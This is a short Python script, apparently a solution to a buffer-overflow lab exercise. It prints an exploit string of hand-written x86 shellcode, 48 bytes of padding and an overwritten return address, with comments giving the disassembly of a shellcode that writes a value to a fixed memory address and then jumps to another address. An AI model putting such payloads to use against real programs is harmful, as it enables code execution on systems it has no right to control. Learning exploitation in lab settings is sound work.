str="\xc7\x05\x60\x41\x86\x80\x78\xea\x85\x29\x68\xa9\xf3\x85\x80\xc3" 
str += "a"*48
str += "\x44\x3D\x68\x55" #44 3D 68 55
print (str)

#   0:   c7 05 60 41 86 80 78    movl   $0x2985ea78,0x80864160
#   7:   ea 85 29
#   a:   68 a9 f3 85 80          push   $0x8085f3a9
#   f:   c3                      ret
